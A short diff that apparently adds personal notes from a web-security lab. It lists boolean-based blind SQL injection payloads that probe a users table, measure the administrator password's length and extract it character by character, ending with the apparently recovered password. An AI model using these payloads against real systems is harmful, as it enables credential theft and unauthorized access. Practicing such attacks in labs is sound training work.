@@ -1,0 +1,9 @@
+' AND '1'='1
+' AND (select 'a' from users limit 1)='a
+' AND (select 'a' from users where username='administrator')='a
+' AND (select 'a' from users where username='administrator' and length(password)>1)='a
+// length = 20
+' AND (select substring(password,1,1) from users where username='administrator')='a
+' AND (select substring(password,2,1) from users where username='administrator')='a
+// repeat attack until we get the whole password
+vzcjisaw9z9tkxf6ra6l
